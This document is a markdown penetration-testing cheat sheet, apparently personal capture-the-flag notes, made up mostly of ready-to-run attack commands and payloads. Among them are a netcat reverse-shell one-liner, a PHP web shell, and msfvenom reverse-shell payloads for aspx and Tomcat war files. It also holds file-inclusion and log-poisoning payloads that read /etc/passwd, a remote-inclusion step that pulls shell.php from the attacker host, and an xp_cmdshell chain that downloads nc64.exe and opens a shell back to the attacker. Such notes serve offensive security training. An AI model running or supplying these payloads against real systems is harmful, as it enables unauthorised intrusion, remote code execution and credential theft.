# :memo: General
## Commands
- Search all files for string: `cat * | grep -i passw*`

## NetCat
- Listen: `nc -lvnp 9001`
- Reverse connect: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 9001 >/tmp/f`
- Upgrade shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

## Metasploit
- List sessions: `sessions -l`
- Once logged in: `use multi/recon/local_exploit_suggester` to see suggestions.
- Try to write always in temp dirs to have write chance

## Privilege Escalation
1.- Find dirs belonging to group: `find / -group [GROUP_NAME] 2>/dev/null`
  - Check privileges and type of file: `ls -la [DIR_PATH] && file [DIR_PATH]`
    - If file has uid set (setuid) it will run as the owner no matters who runs it  

2.- If we know user password: `sudo -l`
    - If we have access to vi: (ALL) /bin/vi
      - Follow this: https://gtfobins.github.io/gtfobins/vi/#sudo

3.- Through metasploit: 
  - `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
  - `use exploit/windows/local/service_permissions`
  - `use exploit/windows/local/ms10_015_kitrap0d`
     
## Process Hacking
- Dump process memory: https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
     
## Zip Cracking
- `zip2john file.zip > hash`
- `john -wordlist=/usr/share/wordlists/rockyou.txt hashes`

## RSA Decypher
- `apt-get install python3-gmpy2`
- Install: https://github.com/Ganapati/RsaCtfTool
- `python3 RsaCtfTool.py --publickey ./key.pub --uncipherfile ./ciphered_file`

## Hashcat
- `hashcat -m [TYPE_OF_HASH] [HASH] [WORDLIST_PATH]`
     
## Rdp
- Connect to RDP: `xfreerdp /v:$VICTIM_IP /cert:ignore /u:Administrator`

## Nmap
- `ports=$(nmap -p- --min-rate=1000 -T4 $TARGET | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`
- `nmap -p-$ports -sC -sV -oA nmap-scripts $TARGET`
- `cat nmap-scripts.nmap`

## SMB
- Remember to add `-U guest` if want to specify user
- Login: `smbclient -L $TARGET`
- List share content:
  - Using `dir` once logged
  - `smbclient \\\\$TARGET\\[FOLDER] -c 'recurse;ls'`
- Download file: 
  - `smbget smb://$TARGET/[FILENAME]`
  - `get [FILENAME]`

# :earth_africa: Website
## Nikto
- `nikto -host $TARGET`

## PHP Shell
- `<?php system($_GET['cmd']); ?>`
- `/usr/share/webshells/php/php-reverse-shell.php`
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER] LPORT=443 -f aspx > devel.aspx`

## File inclusion + Path traversal
- Try to navegate to /etc/passwd like: `https://$TARGET/?page=/etc/passwd`
- Path traversal `../../../../../etc/passwd`
- Url encoding ../ bypass
- Php wrappers
  - `php://filter/read=convert.base64-encode/resource=index`
  - `php://filter/read=convert.base64-encode/resource=/etc/passwd`
  - `php://filter/read=convert.base64-encode/resource=config`
  - `php://filter/read=string.rot13/resource=/etc/passwd`
  - `expect://id`
  - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id`
- Null byte injection
  - `/etc/passwd%00`
- User-agent poisoning:
  - `/var/log/apache2/access.log`
  - `/var/log/nginx/access.log`
  - Get php shell putting this as user-agent: `<?php system($_GET['cmd']); ?>`
  - Add this to GET request: `&cmd=id`
- Cookie session poisoning:
  - `/var/lib/php/sessions/sess_[COOKIE SESSION STRING]`
- Input wrapper:
  - `curl -s -X POST --data "<?php system('id'); ?>" "http://$TARGET/index.php?language=php://input" | grep uid`

## Remote inclusion
- Create shell.php with this content: `<?php system($_GET['cmd']); ?>`
- Http server:
  - `python3 -m http.server 8080 ` 
  - Upload by navigation: `http://$TARGET/index.php?language=http://$IP:8080/shell.php&cmd=id`
- Ftp server:
  - `python -m pyftpdlib -p 21`
  - Upload by navigation: `http://$TARGET/index.php?language=ftp://$IP/shell.php&cmd=id`
    - If need credentials, use: `ftp://user:pass@localhost/shell.php&cmd=id`

## GoBuster
- Find website files: `gobuster -m dir -u http://$TARGET -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html`
- Add `-s 200` if getting many results

## SQL Injection
- Brute-forcing user: `username=admin'#&password=1235`

## XXE Injection
- https://github.com/payloadbox/xxe-injection-payload-list

## XSS to retrieve JS variables
- `<script>alert()</script>`

## SQL Map
- `sqlmap -u http://$TARGET/ --data="username=admin&password=123456" --batch --dump tables`

## MySQL
- `mysql -h $TARGET -u root`

## MSSQL
- Setup (manually from releases, don't git clone) https://github.com/SecureAuthCorp/impacket
- Run impacket script: `python3 mssqlclient.py [HOST]/[USER]@$TARGET -windows-auth`
  - If logged in:
    - `SELECT is_srvrolemember('sysadmin');`
    - Test if cmdshell works: `EXEC xp_cmdshell 'net user';`
      - How to enable cmdshell:
        - `EXEC sp_configure 'show advanced options', 1;`
        - `RECONFIGURE;`
        - `sp_configure;`
        - `EXEC sp_configure 'xp_cmdshell', 1;`
        - `RECONFIGURE;`
    - Upload shell:
      - Mount web server: `sudo python3 -m http.server 80`
      - Netcat listenner: `sudo nc -lvnp 443`
      - Check directory: `xp_cmdshell "powershell -c pwd"`
      - Download shell: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://$IP/nc64.exe -outfile nc64.exe"`
      - Launch shell: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
$IP 443"`
        - Switch cmd to powershell: `powershell`
        - Download PEAS: `wget http://$IP/winPEASx64.exe -outfile winPEASx64.exe`
        - Recommended to `clear` or `cls` before running PEAS
        - Run PEAS: `.\winPEASx64.exe`
        - Read file: `type [FILE_NAME]`
        - If have credentials run Impacket script: `python3 psexec.py administrator@$TARGET`

## Tomcat
- Bruteforce login:
  - Get this python script: https://gist.github.com/itsecurityco/d18198167672ad4e46c7a633f2bb0cc4
  - Example wordlist: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
- Malicious war file:
  - Create war file: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=9001 -f war -o Dimitri.war`
  - Listen connections: 
    - `msfconsole`
    - `use exploit/multi/handler`
    - `set payload windows/meterpreter/reverse_tcp`
    - `set LHOST $IP`
    - `set LPORT 9001`
    - `exploit`
    - `unzip Dimitri.war`
    - Upload .war in Tomcat pannel
    - Access to it through chrome: `http://$TARGET:8080/Dimitri/pgmhryitlm.jsp`

## PRTG Network Monitor
- Stores admin password in `C:\ProgramData\Paessler`
